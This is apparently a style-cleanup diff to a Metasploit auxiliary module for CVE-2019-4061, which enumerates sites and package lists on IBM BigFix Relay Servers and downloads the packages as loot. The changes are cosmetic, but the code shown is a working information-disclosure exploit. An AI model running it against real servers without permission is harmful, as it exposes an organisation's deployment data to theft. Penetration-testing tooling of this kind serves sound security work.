@@ -8,32 +8,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'  => 'IBM BigFix Relay Server Sites and Package Enum',
-      'Description' => %q{
-        This module retrieves masthead, site, and available package information
-        from IBM BigFix Relay Servers.
-      },
-      'Author' =>
-        [
-          'HD Moore',       # Vulnerability Discovery
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM BigFix Relay Server Sites and Package Enum',
+        'Description' => %q{
+          This module retrieves masthead, site, and available package information
+          from IBM BigFix Relay Servers.
+        },
+        'Author' => [
+          'HD Moore', # Vulnerability Discovery
           'Chris Bellows',  # Vulnerability Discovery
           'Ryan Hanson',    # Vulnerability Discovery
           'Jacob Robles'    # Metasploit module
         ],
-      'References' =>
-        [
-          ['CVE','2019-4061'],
-          ['URL','https://www.atredis.com/blog/2019/3/18/harvesting-data-from-bigfix-relay-servers']
+        'References' => [
+          ['CVE', '2019-4061'],
+          ['URL', 'https://www.atredis.com/blog/2019/3/18/harvesting-data-from-bigfix-relay-servers']
         ],
-      'DefaultOptions' =>
-        {
+        'DefaultOptions' => {
           'RPORT' => 52311,
-          'SSL'   => true
+          'SSL' => true
         },
-      'License' => MSF_LICENSE,
-      'DisclosureDate' => '2019-03-18' # Blog post date
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2019-03-18'
+      )
+    ) # Blog post date
 
     register_options [
       OptString.new('TARGETURI', [true, 'Path to the BigFix server', '/']),
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     return unless res && res.code == 200
 
     if res.body =~ /Organization: (.*)./
-      print_good($1)
+      print_good(::Regexp.last_match(1))
     end
 
     res.body.scan(/URL: (.*)./).each do |http|
@@ -88,24 +88,23 @@ class MetasploitModule < Msf::Auxiliary
     myhtml = res.get_html_document
     myhtml.css('.indented p').each do |element|
       element.children.each do |text|
-        if text.class == Nokogiri::XML::Text
-          next if text.text.start_with?('Error')
+        next unless text.instance_of?(Nokogiri::XML::Text)
+        next if text.text.start_with?('Error')
 
-          text.text =~ /^([^ ]+)/
-          case $1
-          when 'Action:'
-            # Save Action to associate URLs
-            text.text =~ /Action: ([0-9]+)/
-            last_action = $1
-            @files[last_action] = []
-            print_status("Action: #{last_action}")
-          when 'url'
-            text.text =~ /^[^:]+: (.*)/
-            uri = URI.parse($1)
-            file = File.basename(uri.path)
-            @files[last_action].append(file)
-            datastore['ShowURL'] ? print_good("URL: #{$1}") : print_good("File: #{file}")
-          end
+        text.text =~ /^([^ ]+)/
+        case ::Regexp.last_match(1)
+        when 'Action:'
+          # Save Action to associate URLs
+          text.text =~ /Action: ([0-9]+)/
+          last_action = ::Regexp.last_match(1)
+          @files[last_action] = []
+          print_status("Action: #{last_action}")
+        when 'url'
+          text.text =~ /^[^:]+: (.*)/
+          uri = URI.parse(::Regexp.last_match(1))
+          file = File.basename(uri.path)
+          @files[last_action].append(file)
+          datastore['ShowURL'] ? print_good("URL: #{::Regexp.last_match(1)}") : print_good("File: #{file}")
         end
       end
     end
@@ -115,6 +114,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Downloading packages')
     @files.each do |action, val|
       next if val.empty?
+
       res = send_req("bfmirror/downloads/#{action}/0")
       next unless res && res.code == 200
 
@@ -126,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       myloot = store_loot('ibm.bigfix.package', File.extname(val.first), datastore['RHOST'], res.body, val.first)
-      print_good("Saved #{val.first} to #{myloot.to_s}")
+      print_good("Saved #{val.first} to #{myloot}")
     end
   end
 
